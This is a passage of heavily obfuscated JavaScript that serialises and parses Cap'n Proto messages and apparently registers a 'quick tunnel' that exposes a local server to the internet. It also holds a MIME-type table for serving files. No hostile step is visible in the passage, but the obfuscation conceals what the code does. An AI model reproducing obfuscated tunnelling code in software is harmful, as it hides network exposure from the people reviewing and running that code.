                                c['push'](0x8d);
                            else
                                d === hd(0xf02) && b[hd(0x713)](f, b['srvAi']) ? c['push'](0x8e) : (c[hd(0x59a)](...b[hd(0x605)](a0b4, 0x0, 0x4, 0x0)), c[hd(0x59a)](...a0b5(d)), c[hd(0x59a)](...b['FuMWk'](a0b5, f)));
                        }
                    }
                }
            }
        }
    }
    return Buffer[hd(0x58d)](c);
}
class a0b7 {
    constructor() {
        const he = a0d0;
        this[he(0xad3)] = [];
    }
    [a0d0(0xacf)](a) {
        const hf = a0d0, b = {
                'xXraB': function (d, f) {
                    return d < f;
                }
            }, c = this[hf(0xad3)][hf(0x615)];
        for (let d = 0x0; b[hf(0xb20)](d, a); d++) {
            this['words'][hf(0x59a)](0x0n);
        }
        return c;
    }
    [a0d0(0x49b)](a, b, c, d) {
        const hg = a0d0, f = {
                'MXKqw': function (j, k) {
                    return j - k;
                },
                'eanXi': function (j, k) {
                    return j << k;
                },
                'Yqyvq': function (j, k) {
                    return j(k);
                },
                'Rbkxz': function (j, k) {
                    return j | k;
                },
                'DXIEV': function (j, k) {
                    return j & k;
                },
                'mcBbf': function (j, k) {
                    return j << k;
                },
                'EZGPZ': function (j, k) {
                    return j(k);
                }
            }, g = f[hg(0x2ec)](f[hg(0x2ec)](b, a), 0x1), h = f[hg(0x914)](f[hg(0x863)](BigInt, g), 0x2n) & 0xfffffffcn, i = f[hg(0xd67)](BigInt(f['DXIEV'](c, 0xffff)), f['mcBbf'](f[hg(0xa8b)](BigInt, f[hg(0xb9d)](d, 0xffff)), 0x10n));
        this[hg(0xad3)][a] = f[hg(0xd67)](h, f[hg(0x1c9)](i, 0x20n));
    }
    [a0d0(0x617)](a, b, c) {
        const hh = a0d0, d = {
                'ryRdl': function (g, h) {
                    return g << h;
                },
                'nzsze': function (g, h) {
                    return g(h);
                },
                'BMGTp': function (g, h) {
                    return g | h;
                },
                'uREgM': function (g, h) {
                    return g & h;
                },
                'iXXRx': function (g, h) {
                    return g << h;
                },
                'XcPBH': function (g, h) {
                    return g * h;
                }
            }, f = d[hh(0x539)](0xffn, d['nzsze'](BigInt, b * 0x8));
        this[hh(0xad3)][a] = d[hh(0x124)](d[hh(0x816)](this[hh(0xad3)][a], ~f), d[hh(0x321)](d[hh(0x4a0)](BigInt, d[hh(0x816)](c, 0xff)), BigInt(d[hh(0x119)](b, 0x8))));
    }
    [a0d0(0x40e)](a, b, c) {
        const hi = a0d0, d = {
                'GGEna': function (g, h) {
                    return g << h;
                },
                'kZHFl': function (g, h) {
                    return g(h);
                },
                'ZBBch': function (g, h) {
                    return g * h;
                },
                'shzXu': function (g, h) {
                    return g | h;
                },
                'zRblW': function (g, h) {
                    return g & h;
                },
                'tylEb': function (g, h) {
                    return g(h);
                },
                'REkcb': function (g, h) {
                    return g * h;
                }
            }, f = d[hi(0x112)](0xffffn, d[hi(0x4d1)](BigInt, d['ZBBch'](b, 0x8)));
        this['words'][a] = d[hi(0x328)](d[hi(0x644)](this['words'][a], ~f), BigInt(c & 0xffff) << d[hi(0x16b)](BigInt, d[hi(0x434)](b, 0x8)));
    }
    [a0d0(0x741)](a, b, c) {
        const hj = a0d0, d = {
                'ZEDNA': function (g, h) {
                    return g << h;
                },
                'XFsrI': function (g, h) {
                    return g(h);
                },
                'alrDb': function (g, h) {
                    return g * h;
                },
                'rUzSZ': function (g, h) {
                    return g | h;
                },
                'MbBmH': function (g, h) {
                    return g & h;
                },
                'DLnpr': function (g, h) {
                    return g << h;
                },
                'iZLvg': function (g, h) {
                    return g & h;
                },
                'rXPbp': function (g, h) {
                    return g * h;
                }
            }, f = d[hj(0x4ea)](0xffffffffn, d[hj(0xd5b)](BigInt, d[hj(0x3fe)](b, 0x8)));
        this[hj(0xad3)][a] = d['rUzSZ'](d[hj(0x196)](this[hj(0xad3)][a], ~f), d[hj(0x163)](d[hj(0xd5b)](BigInt, d[hj(0x138)](c, 0xffffffff)), d[hj(0xd5b)](BigInt, d[hj(0xe29)](b, 0x8))));
    }
    [a0d0(0x153)](a, b) {
        const hk = a0d0, c = {
                'sodnW': function (d, f) {
                    return d & f;
                },
                'kizKh': function (d, f) {
                    return d(f);
                }
            };
        this[hk(0xad3)][a] = c['sodnW'](c[hk(0xea5)](BigInt, b), 0xffffffffffffffffn);
    }
    [a0d0(0x2f3)](a, b, c = ![]) {
        const hl = a0d0, d = {
                'rhhBv': function (m, n) {
                    return m === n;
                },
                'GSndt': hl(0xefa),
                'ZMfaP': 'utf8',
                'cprZj': function (m, n) {
                    return m + n;
                },
                'ORFzX': function (m, n) {
                    return m / n;
                },
                'MkWcF': function (m, n) {
                    return m < n;
                },
                'NcRxh': function (m, n) {
                    return m / n;
                },
                'Jtdfi': function (m, n) {
                    return m - n;
                },
                'krcUV': function (m, n) {
                    return m & n;
                },
                'EeIHn': function (m, n) {
                    return m | n;
                },
                'sNygL': function (m, n) {
                    return m << n;
                },
                'GnkDX': function (m, n) {
                    return m(n);
                }
            }, f = d[hl(0xad)](typeof b, d['GSndt']) ? Buffer[hl(0x58d)](b, d[hl(0x22d)]) : b, g = d[hl(0x9d4)](f[hl(0x615)], c ? 0x1 : 0x0), h = this['alloc'](Math[hl(0x336)](d[hl(0xc07)](g, 0x8)));
        for (let m = 0x0; d['MkWcF'](m, f[hl(0x615)]); m++) {
            this['setU8'](d[hl(0x9d4)](h, Math['floor'](d[hl(0x533)](m, 0x8))), m % 0x8, f[m]);
        }
        const j = d[hl(0x99e)](d[hl(0x99e)](h, a), 0x1), k = d[hl(0x811)](d[hl(0xb52)](d[hl(0xd60)](d['GnkDX'](BigInt, j), 0x2n), 0x1n), 0xffffffffn), l = d[hl(0xb52)](0x2n, d[hl(0xd60)](d[hl(0xd9b)](BigInt, g & 0x1fffffff), 0x3n));
        this[hl(0xad3)][a] = d[hl(0xb52)](k, d[hl(0xd60)](l, 0x20n));
    }
    [a0d0(0x12c)](a, b) {
        const hm = a0d0, c = {
                'EENUf': function (g, h) {
                    return g - h;
                },
                'nrYJJ': function (g, h) {
                    return g | h;
                },
                'CaAbT': function (g, h) {
                    return g & h;
                },
                'MqVHh': function (g, h) {
                    return g << h;
                },
                'ypUzQ': function (g, h) {
                    return g(h);
                },
                'tbsrD': function (g, h) {
                    return g < h;
                }
            };
        if (!b[hm(0x615)]) {
            this['words'][a] = 0x0n;
            return;
        }
        const d = this['alloc'](b[hm(0x615)]), f = c[hm(0x84a)](c['EENUf'](d, a), 0x1);
        this[hm(0xad3)][a] = c[hm(0x398)](c[hm(0x5af)](c[hm(0x398)](c['MqVHh'](c['ypUzQ'](BigInt, f), 0x2n), 0x1n), 0xffffffffn), c[hm(0xb04)](c[hm(0x398)](0x6n, c[hm(0xb04)](c[hm(0xa8e)](BigInt, b[hm(0x615)]), 0x3n)), 0x20n));
        for (let g = 0x0; c[hm(0x18b)](g, b[hm(0x615)]); g++) {
            this[hm(0x2f3)](d + g, b[g], !![]);
        }
    }
    [a0d0(0x52a)](a, b, c, d, f) {
        const hn = a0d0, g = {
                'BicMa': function (m, n) {
                    return m * n;
                },
                'kqkgo': function (m, n) {
                    return m - n;
                },
                'UlxfS': function (m, n) {
                    return m & n;
                },
                'fnQQY': function (m, n) {
                    return m << n;
                },
                'TlrLs': function (m, n) {
                    return m(n);
                },
                'xQvao': function (m, n) {
                    return m << n;
                },
                'BEKzO': function (m, n) {
                    return m | n;
                },
                'iXhRw': function (m, n) {
                    return m << n;
                },
                'ZBSBU': function (m, n) {
                    return m * n;
                },
                'aFsGO': function (m, n) {
                    return m | n;
                },
                'OzDXn': function (m, n) {
                    return m | n;
                },
                'GXMSQ': function (m, n) {
                    return m(n);
                },
                'LazRi': function (m, n) {
                    return m(n);
                },
                'NlGCY': function (m, n) {
                    return m << n;
                },
                'GeCiY': function (m, n) {
                    return m < n;
                },
                'rllSP': function (m, n, o) {
                    return m(n, o);
                },
                'bJFSu': function (m, n) {
                    return m + n;
                }
            }, h = this[hn(0xacf)](0x1), j = c + d, k = this['alloc'](g[hn(0x2e6)](b, j)), l = g[hn(0xe86)](h, a) - 0x1;
        this[hn(0xad3)][a] = g[hn(0x11f)](g['fnQQY'](g[hn(0xa13)](BigInt, l), 0x2n) | 0x1n, 0xffffffffn) | g[hn(0xe30)](g[hn(0x70e)](g['iXhRw'](g[hn(0xe50)](g[hn(0xa13)](BigInt, b), g[hn(0xa13)](BigInt, j)), 0x3n), 0x7n), 0x20n), this['words'][h] = g[hn(0x71f)](g['OzDXn'](g['iXhRw'](g[hn(0x85f)](BigInt, b), 0x2n), g[hn(0xec7)](g[hn(0xe4c)](BigInt, c), 0x20n)), g['NlGCY'](BigInt(d), 0x30n));
        for (let m = 0x0; g[hn(0xec8)](m, b); m++) {
            g[hn(0x4d0)](f, m, g[hn(0x7a1)](k, g[hn(0x2e6)](m, j)));
        }
    }
    [a0d0(0x851)]() {
        const ho = a0d0, a = {
                'vLzoo': function (d, f) {
                    return d * f;
                },
                'HOGPZ': function (d, f) {
                    return d < f;
                },
                'nVrec': function (d, f) {
                    return d & f;
                }
            }, b = Buffer[ho(0xacf)](0x8);
        b['writeUInt32LE'](0x0, 0x0), b[ho(0xbd8)](this[ho(0xad3)]['length'], 0x4);
        const c = Buffer[ho(0xacf)](a[ho(0x2b3)](this[ho(0xad3)][ho(0x615)], 0x8));
        for (let d = 0x0; a[ho(0x66b)](d, this[ho(0xad3)][ho(0x615)]); d++) {
            c[ho(0x26c)](a[ho(0xf19)](this[ho(0xad3)][d], 0xffffffffffffffffn), d * 0x8);
        }
        return Buffer[ho(0x7b6)]([
            b,
            c
        ]);
    }
}
function a0b8(a) {
    const hp = a0d0, b = new a0b7(), c = b[hp(0xacf)](0x1), d = b[hp(0xacf)](0x1), f = b[hp(0xacf)](0x1);
    b[hp(0x49b)](c, d, 0x1, 0x1), b[hp(0x40e)](d, 0x0, 0x8);
    const g = b[hp(0xacf)](0x1);
    return b[hp(0xacf)](0x1), b[hp(0x49b)](f, g, 0x1, 0x1), b[hp(0x741)](g, 0x0, a), b[hp(0x851)]();
}
function a0b9(a, b, c, d, f, g) {
    const hq = a0d0, h = {
            'RhvYm': function (H, I) {
                return H | I;
            },
            'PHwHF': function (H, I) {
                return H & I;
            },
            'SpmcI': function (H, I) {
                return H & I;
            },
            'sAbrM': 'serialized_headers',
            'DMQCy': hq(0x770),
            'lUCTb': hq(0x561),
            'fdJjV': 'Nexus-Python'
        }, i = new a0b7(), j = i['alloc'](0x1), k = i[hq(0xacf)](0x1), l = i[hq(0xacf)](0x1);
    i['structPtr'](j, k, 0x1, 0x1), i[hq(0x40e)](k, 0x0, 0x2);
    const m = i[hq(0xacf)](0x1), n = i[hq(0xacf)](0x1);
    i[hq(0xacf)](0x1);
    const o = i[hq(0xacf)](0x1), p = i[hq(0xacf)](0x1);
    i[hq(0xacf)](0x1), i[hq(0x49b)](l, m, 0x3, 0x3), i[hq(0x741)](m, 0x0, a), i[hq(0x153)](n, 0xf71695ec7fe85497n);
    const q = i[hq(0xacf)](0x1), r = i['alloc'](0x1);
    i[hq(0x49b)](o, q, 0x1, 0x1), i['setU16'](q, 0x4, 0x1);
    const s = i[hq(0xacf)](0x1);
    i[hq(0xacf)](0x1), i[hq(0x49b)](r, s, 0x1, 0x1), i[hq(0x741)](s, 0x0, b);
    const t = i['alloc'](0x1);
    i[hq(0xacf)](0x1), i[hq(0x49b)](p, t, 0x0, 0x2);
    const u = i[hq(0xacf)](0x1), v = i[hq(0xacf)](0x1), w = i['alloc'](0x1), x = i[hq(0xacf)](0x1);
    i['structPtr'](t, u, 0x1, 0x3), i['setU8'](u, 0x0, g);
    const y = i[hq(0xacf)](0x1), z = i['alloc'](0x1);
    i['structPtr'](v, y, 0x0, 0x2), i[hq(0x2f3)](y, c, !![]), i[hq(0x2f3)](z, d), i[hq(0x2f3)](w, f);
    const A = i[hq(0xacf)](0x1), B = i[hq(0xacf)](0x1);
    i[hq(0xacf)](0x1), i['structPtr'](x, A, 0x1, 0x2);
    const C = i['alloc'](0x1), D = i[hq(0xacf)](0x1), E = i[hq(0xacf)](0x1), F = i[hq(0xacf)](0x1);
    i['structPtr'](B, C, 0x0, 0x4);
    const G = a0k[hq(0x91e)](0x10);
    return G[0x6] = h[hq(0x4ad)](h['PHwHF'](G[0x6], 0xf), 0x40), G[0x8] = h['RhvYm'](h[hq(0xd86)](G[0x8], 0x3f), 0x80), i['writeBytes'](C, G), i['writeTextList'](D, [
        h['sAbrM'],
        h[hq(0x255)]
    ]), i[hq(0x2f3)](E, h[hq(0xa58)], !![]), i[hq(0x2f3)](F, h[hq(0x4d9)], !![]), i[hq(0x851)]();
}
function a0ba(a) {
    const hr = a0d0, b = {
            'AUXQT': function (f, g) {
                return f >= g;
            },
            'OYqlz': function (f, g) {
                return f - g;
            },
            'AsszI': function (f, g) {
                return f + g;
            },
            'MDToE': function (f, g) {
                return f + g;
            },
            'VVZtv': function (f, g) {
                return f * g;
            },
            'MmUQX': function (f, g) {
                return f % g;
            },
            'zbhqe': function (f, g) {
                return f + g;
            },
            'CTdWt': function (f, g) {
                return f + g;
            },
            'Lahrg': function (f, g) {
                return f < g;
            },
            'wMnKk': function (f, g) {
                return f !== g;
            },
            'DifQv': hr(0x723)
        }, c = [];
    let d = 0x0;
    while (b[hr(0xb8)](b[hr(0x780)](a[hr(0x615)], d), 0x8)) {
        const f = a[hr(0xe9c)](d), g = a['readUInt32LE'](b[hr(0x445)](d, 0x4)), h = b[hr(0x445)](f, 0x1);
        let j = b['MDToE'](h, 0x1), k = b[hr(0xe3c)](j, 0x4);
        b[hr(0xcfd)](k, 0x8) && (k += 0x4);
        if (b[hr(0x780)](a[hr(0x615)], d) < k)
            break;
        const l = [g];
        for (let n = 0x1; n < h; n++) {
            l[hr(0x59a)](a['readUInt32LE'](b[hr(0x55e)](b['CTdWt'](d, 0x4), b[hr(0xe3c)](n, 0x4))));
        }
        const m = k + b[hr(0xe3c)](l['reduce']((o, p) => o + p, 0x0), 0x8);
        if (b[hr(0xbfc)](a[hr(0x615)] - d, m))
            break;
        if (b[hr(0x23d)](h, 0x1))
            throw new Error(b[hr(0xecc)]);
        c[hr(0x59a)](a[hr(0x3d1)](b['MDToE'](d, k), b[hr(0x445)](d, m))), d += m;
    }
    return [
        c,
        a[hr(0x3d1)](d)
    ];
}
function a0bb(a, b) {
    const hs = a0d0, c = {
            'BGQKD': function (j, k) {
                return j >= k;
            },
            'Psopd': hs(0x27c),
            'hYzwU': function (j, k) {
                return j !== k;
            },
            'xJBdz': function (j, k) {
                return j & k;
            },
            'dXNOk': hs(0x1fd),
            'MtqsS': function (j, k) {
                return j >> k;
            },
            'bZuJU': function (j, k) {
                return j + k;
            },
            'UPLem': function (j, k) {
                return j(k);
            },
            'mNFAl': function (j, k) {
                return j & k;
            },
            'AmfQE': function (j, k) {
                return j >> k;
            },
            'eGtfw': function (j, k) {
                return j < k;
            }
        };
    if (c['BGQKD'](b, a[hs(0x615)]))
        throw new Error(c[hs(0x8ff)]);
    const d = a[b];
    if (c[hs(0xa6c)](c[hs(0x3df)](d, 0x3n), 0x0n))
        throw new Error(c[hs(0x8cd)]);
    let f = c[hs(0x3d9)](d, 0x2n) & 0x3fffffffn;
    c['xJBdz'](f, 0x20000000n) && (f -= 0x40000000n);
    const g = c[hs(0x94f)](b, 0x1) + c[hs(0x2ac)](Number, f), h = Number(c[hs(0x3d9)](d, 0x20n) & 0xffffn), i = c['UPLem'](Number, c[hs(0xb3e)](c[hs(0x17a)](d, 0x30n), 0xffffn));
    if (c['eGtfw'](g, 0x0) || g + h + i > a[hs(0x615)])
        throw new Error(c['Psopd']);
    return [
        g,
        h,
        i
    ];
}
function a0bc(a) {
    const ht = a0d0, b = {
            'OKIkM': function (d, f) {
                return d + f;
            }
        }, c = [];
    for (let d = 0x0; b[ht(0xc40)](d, 0x8) <= a[ht(0x615)]; d += 0x8) {
        c[ht(0x59a)](a['readBigUInt64LE'](d));
    }
    return c;
}
function a0bd(a, b) {
    const hu = a0d0, c = {
            'afGyS': function (p, q) {
                return p !== q;
            },
            'hQzwf': function (p, q) {
                return p & q;
            },
            'NhbnF': function (p, q) {
                return p >> q;
            },
            'tMNBd': function (p, q) {
                return p >> q;
            },
            'fNFia': function (p, q) {
                return p & q;
            },
            'Vzigc': function (p, q) {
                return p + q;
            },
            'pUYSa': function (p, q) {
                return p(q);
            },
            'LAizw': function (p, q) {
                return p(q);
            },
            'Jontg': function (p, q) {
                return p < q;
            },
            'WdOSk': function (p, q) {
                return p & q;
            },
            'aypPV': function (p, q) {
                return p(q);
            },
            'qQBOP': function (p, q) {
                return p & q;
            },
            'kfeVs': function (p, q) {
                return p >> q;
            },
            'pQQyh': function (p, q) {
                return p + q;
            },
            'xKYtv': function (p, q) {
                return p < q;
            },
            'WAiKf': function (p, q) {
                return p === q;
            },
            'YWqxW': function (p, q) {
                return p !== q;
            },
            'ZOJRn': function (p, q) {
                return p + q;
            },
            'rEAEq': function (p, q) {
                return p * q;
            },
            'RBHQa': function (p, q, r) {
                return p(q, r);
            },
            'dHYlb': function (p, q) {
                return p + q;
            },
            'xRDBS': function (p, q) {
                return p + q;
            }
        };
    if (b >= a['length'])
        return null;
    const d = a[b];
    if ((d & 0x3n) !== 0x1n || c[hu(0x3bc)](c[hu(0xd3c)](c[hu(0xa5d)](d, 0x20n), 0x7n), 0x7n))
        return null;
    let f = c[hu(0xd3c)](c[hu(0x4a4)](d, 0x2n), 0x3fffffffn);
    c[hu(0x799)](f, 0x20000000n) && (f -= 0x40000000n);
    const g = c[hu(0x358)](b, 0x1) + c['pUYSa'](Number, f), h = c[hu(0x50e)](Number, c[hu(0xa5d)](d, 0x23n));
    if (c['Jontg'](g, 0x0) || g >= a[hu(0x615)])
        return null;
    const j = a[g];
    if (c[hu(0x1f2)](j, 0x3n) !== 0x0n)
        return null;
    const k = c['aypPV'](Number, c[hu(0x799)](j >> 0x20n, 0xffffn)), l = Number(c[hu(0xba7)](c[hu(0x25a)](j, 0x30n), 0xffffn)), m = c[hu(0x50e)](Number, c[hu(0xba7)](j >> 0x2n, 0x3fffffffn)), n = c[hu(0xb19)](k, l);
    if (c[hu(0x28e)](l, 0x2) || c['WAiKf'](n, 0x0) || c[hu(0xb3a)](n * m, h))
        return null;
    if (c['ZOJRn'](c['ZOJRn'](g, 0x1), n * m) > a[hu(0x615)])
        return null;
    const o = [];
    for (let p = 0x0; c[hu(0x801)](p, m); p++) {
        const q = c[hu(0x358)](c[hu(0x358)](g, 0x1), c['rEAEq'](p, n));
        o[hu(0x59a)]([
            c[hu(0x432)](a0be, a, c[hu(0x41a)](q, k)),
            c[hu(0x432)](a0be, a, c[hu(0xa4f)](c[hu(0x437)](q, k), 0x1))
        ]);
    }
    return o;
}
function a0be(a, b) {
    const hv = a0d0, c = {
            'mFCER': function (m, n) {
                return m >= n;
            },
            'crssV': function (m, n) {
                return m & n;
            },
            'Dqgvr': function (m, n) {
                return m >> n;
            },
            'WeaJa': function (m, n) {
                return m & n;
            },
            'ekTIf': function (m, n) {
                return m + n;
            },
            'tyBrF': function (m, n) {
                return m(n);
            },
            'jUoVL': function (m, n) {
                return m(n);
            },
            'NzHig': function (m, n) {
                return m & n;
            },
            'QBeTP': function (m, n) {
                return m >> n;
            },
            'GvGoF': function (m, n) {
                return m < n;
            },
            'tJiDS': function (m, n) {
                return m > n;
            },
            'aFDWO': function (m, n) {
                return m * n;
            },
            'hrQyI': function (m, n) {
                return m & n;
            },
            'yDYVP': function (m, n) {
                return m * n;
            },
            'mPwUB': hv(0x132)
        };
    if (c['mFCER'](b, a[hv(0x615)]))
        return '';
    const d = a[b];
    if (c['crssV'](d, 0x3n) !== 0x1n)
        return '';
    let f = c[hv(0x1d0)](c[hv(0xd73)](d, 0x2n), 0x3fffffffn);
    c[hv(0x2f1)](f, 0x20000000n) && (f -= 0x40000000n);
    const g = c[hv(0xe87)](b, 0x1) + c[hv(0x5b4)](Number, f), h = c[hv(0xa8f)](Number, c['NzHig'](c[hv(0xd73)](d, 0x20n), 0x7n)), j = c['tyBrF'](Number, c['QBeTP'](d, 0x23n)), k = Math[hv(0x336)](j / 0x8);
    if (h !== 0x2 || c['GvGoF'](g, 0x0) || c[hv(0xc6d)](c[hv(0xe87)](g, k), a[hv(0x615)]))
        return '';
    const l = Buffer[hv(0xacf)](c[hv(0xf1a)](k, 0x8));
    for (let m = 0x0; c[hv(0x4fe)](m, k); m++) {
        l[hv(0x26c)](c[hv(0x635)](a[c[hv(0xe87)](g, m)], 0xffffffffffffffffn), c[hv(0x6c1)](m, 0x8));
    }
    return l['subarray'](0x0, j)[hv(0xa27)](c['mPwUB'])['replace'](/\0+$/, '');
}
function a0bf(a) {
    const hw = a0d0, b = {
            'AxXDu': function (u, v) {
                return u % v;
            },
            'Auqar': function (u, v) {
                return u < v;
            },
            'UtuYx': 'short\x20Cap\x27n\x20Proto\x20return',
            'LPzNu': function (u, v) {
                return u(v);
            },
            'DQpUt': function (u, v, w) {
                return u(v, w);
            },
            'UxPBd': function (u, v) {
                return u !== v;
            },
            'KCUdp': function (u, v) {
                return u & v;
            },
            'sjscN': hw(0x62b),
            'Plpai': function (u, v, w) {
                return u(v, w);
            },
            'ACbha': function (u, v) {
                return u === v;
            },
            'Bxvlf': function (u, v, w) {
                return u(v, w);
            },
            'EJHCY': function (u, v) {
                return u + v;
            },
            'NyvjW': hw(0xd83),
            'myyNN': function (u, v) {
                return u + v;
            },
            'vdhEY': function (u, v) {
                return u + v;
            },
            'pmxTK': function (u, v) {
                return u === v;
            },
            'XtiUI': function (u, v) {
                return u & v;
            },
            'RwDzP': function (u, v) {
                return u + v;
            },
            'rkvva': function (u, v) {
                return u > v;
            },
            'vQdOU': function (u, v) {
                return u(v);
            },
            'yTFXe': function (u, v) {
                return u === v;
            },
            'dZRAE': function (u, v, w) {
                return u(v, w);
            },
            'DZtrT': function (u, v) {
                return u + v;
            },
            'IAOCj': function (u, v) {
                return u + v;
            },
            'gmZKm': function (u, v, w) {
                return u(v, w);
            },
            'ZlrIK': function (u, v) {
                return u + v;
            },
            'oCmfS': function (u, v) {
                return u || v;
            }
        };
    if (b[hw(0xe6e)](a[hw(0x615)], 0x8) || b[hw(0xaa8)](a['length'], 0x10))
        throw new Error(b[hw(0x9aa)]);
    const c = b['LPzNu'](a0bc, a);
    let d, f, g;
    [d, f, g] = b['DQpUt'](a0bb, c, 0x0);
    if (b[hw(0xaa8)](f, 0x1) || b[hw(0x298)](b['KCUdp'](c[d], 0xffffn), 0x3n))
        throw new Error(b[hw(0x314)]);
    const [h, i, j] = b['Plpai'](a0bb, c, d + f), k = Number(b[hw(0xb26)](c[h] >> 0x30n, 0xffffn));
    if (b['ACbha'](k, 0x4)) {
        const [u, v] = b[hw(0xd15)](a0bb, c, h + i);
        return {
            'ok': ![],
            'error': b[hw(0xd15)](a0be, c, b['EJHCY'](u, v)) || b[hw(0xc91)]
        };
    }
    if (k !== 0x0)
        return {
            'ok': ![],
            'error': b[hw(0x19c)](hw(0x746), k)
        };
    const [l, m, n] = a0bb(c, b[hw(0x19c)](h, i));
    if (!n)
        return {
            'ok': ![],
            'error': hw(0x3dc)
        };
    const o = c[b['vdhEY'](l, m)];
    if (b[hw(0x7e5)](b['XtiUI'](o, 0x3n), 0x3n))
        return {
            'ok': ![],
            'bootstrap': !![]
        };
    let p, q, r;
    [p, q, r] = b[hw(0xd15)](a0bb, c, b[hw(0x529)](l, m));
    b[hw(0x7e5)](q, 0x0) && b[hw(0x7e5)](r, 0x1) && ([p, q, r] = b[hw(0xd15)](a0bb, c, b['RwDzP'](p, q)));
    const s = b[hw(0xd4)](q, 0x0) ? b['vQdOU'](Number, b[hw(0x7b4)](c[p], 0xffffn)) : 0x0;
    if (b[hw(0xbf9)](s, 0x1)) {
        const [w, x] = b[hw(0xacd)](a0bb, c, p + q), y = a0be(c, b[hw(0xea9)](b[hw(0xa6f)](w, x), 0x1));
        return {
            'ok': !![],
            'location': y
        };
    }
    const t = b[hw(0x27a)](a0be, c, b[hw(0x95c)](p, q));
    return {
        'ok': ![],
        'error': b[hw(0x9c2)](t, b[hw(0xc91)])
    };
}
function a0bg(a) {
    const hx = a0d0, b = {
            'qOIMI': function (h, i) {
                return h(i);
            },
            'mfwBd': 'empty\x20Cap\x27n\x20Proto\x20ConnectRequest',
            'iEWYS': function (h, i, j) {
                return h(i, j);
            },
            'azPmh': function (h, i) {
                return h < i;
            },
            'bHvNG': hx(0xa38),
            'bzjqe': function (h, i, j) {
                return h(i, j);
            },
            'NYRcP': function (h, i) {
                return h + i;
            },
            'ZVzcp': function (h, i) {
                return h & i;
            },
            'QkOLJ': function (h, i, j) {
                return h(i, j);
            },
            'pDhDO': function (h, i) {
                return h + i;
            }
        }, c = b[hx(0xb3f)](a0bc, a);
    if (!c[hx(0x615)])
        throw new Error(b[hx(0x862)]);
    let d, f, g;
    [d, f, g] = b[hx(0x806)](a0bb, c, 0x0);
    if (b[hx(0x2d6)](f, 0x1) || b[hx(0x2d6)](g, 0x2))
        throw new Error(b['bHvNG']);
    return {
        'dest': b['bzjqe'](a0be, c, b[hx(0x567)](d, f)),
        'type': b[hx(0xb3f)](Number, b['ZVzcp'](c[d], 0xffffn)),
        'metadata': b[hx(0x694)](a0bd, c, b[hx(0x567)](b[hx(0xf0f)](d, f), 0x1)) || []
    };
}
function a0bh(a, b) {
    const hy = a0d0, c = new a0b7(), d = c[hy(0xacf)](0x1), f = c[hy(0xacf)](0x2);
    return c[hy(0x49b)](d, f, 0x0, 0x2), c[hy(0x2f3)](f, a || '', !![]), c[hy(0x52a)](f + 0x1, b[hy(0x615)], 0x0, 0x2, (g, h) => {
        const hz = hy;
        c[hz(0x2f3)](h, b[g][0x0], !![]), c[hz(0x2f3)](h + 0x1, b[g][0x1], !![]);
    }), c['finish']();
}
const a0bi = {
    '.js': 'text/javascript;\x20charset=utf-8',
    '.mjs': a0d0(0xcbb),
    '.css': 'text/css;\x20charset=utf-8',
    '.json': a0d0(0x49c),
    '.map': a0d0(0x49c),
    '.wasm': a0d0(0x46d),
    '.html': a0d0(0xeb),
    '.htm': a0d0(0xeb),
    '.svg': a0d0(0x4e1),
    '.xml': a0d0(0x84e),
    '.woff': a0d0(0x95b),
    '.woff2': a0d0(0x95b),
    '.png': 'image/png',
    '.jpg': 'image/jpeg',
    '.jpeg': a0d0(0xf03),
    '.gif': a0d0(0xa3a),
    '.ico': 'image/x-icon'
};
function a0bj(a) {
    const hA = a0d0, b = {
            'TlSBi': function (f, g) {
                return f < g;
            }
        }, c = a[hA(0x361)]('/') ? a[hA(0x174)](0x0, -0x1) : a, d = c[hA(0x352)]('.');
    if (b[hA(0xc85)](d, 0x0))
        return '';
    return a0bi[c['slice'](d)[hA(0x777)]()] || '';
}
function a0bk(a) {
    const hB = a0d0, b = {
            'twYNu': function (c, d) {
                return c !== d;
            },
            'AqHuZ': hB(0xefa),
            'PrIIk': hB(0x2cc),
            'eGQhG': function (c, d) {
                return c % d;
            }
        };
    if (Array[hB(0x5f9)](a))
        return Buffer[hB(0x58d)](a);
    if (b['twYNu'](typeof a, b['AqHuZ']))
        throw new Error(b[hB(0xedd)]);
    return Buffer[hB(0x58d)](a + '='['repeat'](b[hB(0xba0)](-a[hB(0x615)], 0x4)), hB(0xc75));
}
const a0bl = /^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$/;
function a0bm(a) {
    const hC = a0d0, b = {
            'BiJyX': function (c, d) {
                return c(d);
            },
            'OPhMb': function (c, d) {
                return c + d;
            },
            'oHOeO': 'quick\x20tunnel\x20returned\x20non-JSON\x20(',
            'MADLQ': hC(0x5c8),
            'gkiJH': function (c, d) {
                return c(d);
            },
            'uaQbT': hC(0x12b),
            'AoCLZ': hC(0xbeb),
            'rlPGs': hC(0xaef),
            'mOFjC': hC(0x211),
            'IdLDm': hC(0x426),
            'lJLTd': 'error',
            'xuEmz': 'end',
            'ahsXz': hC(0xd04),
            'jGsNb': function (c, d) {
                return c === d;
            },
            'cfIaY': hC(0xbc7),
            'hmBmU': 'POST',
            'WETZi': hC(0xd7a),
            'EGxUd': hC(0xe6b)
        };
    return new Promise((c, d) => {
        const hD = hC;
        let f;
        try {
            f = new URL(b['OPhMb'](a['replace'](/\/+$/, ''), b[hD(0xa5f)]));
        } catch (i) {
            b[hD(0x91c)](d, new Error(b[hD(0x4e8)]('requesting\x20quick\x20tunnel\x20failed:\x20', i[hD(0xf18)])));
            return;
        }
        const g = b[hD(0x4dc)](f[hD(0xcf9)], b[hD(0x926)]) ? a0h : a0g, h = g[hD(0x6be)](f, {
                'method': b[hD(0x7be)],
                'headers': {
                    'Content-Type': b[hD(0x3dd)],
                    'User-Agent': b[hD(0x1bf)]
                },
                'timeout': 0x3a98
            }, j => {
                const hE = hD, k = {
                        'BhKEU': 'utf8',
                        'DXLhK': function (m, n) {
                            return b['BiJyX'](m, n);
                        },
                        'FjJWa': function (m, n) {
                            return b['OPhMb'](m, n);
                        },
                        'JJGry': function (m, n) {
                            return m + n;
                        },
                        'EyBbT': function (m, n) {
                            return b['OPhMb'](m, n);
                        },
                        'nGiMk': b[hE(0x5a8)],
                        'obPeE': b['MADLQ'],
                        'CLkAc': function (m, n) {
                            const hF = hE;
                            return b[hF(0xd44)](m, n);
                        },
                        'lLGzp': function (m, n) {
                            const hG = hE;
                            return b[hG(0x4e8)](m, n);
                        },
                        'kjIIW': hE(0x545),
                        'lQiSh': function (m, n) {
                            const hH = hE;
                            return b[hH(0x91c)](m, n);
                        },
                        'EmWgk': b[hE(0x96a)],
                        'rsYDU': function (m, n) {
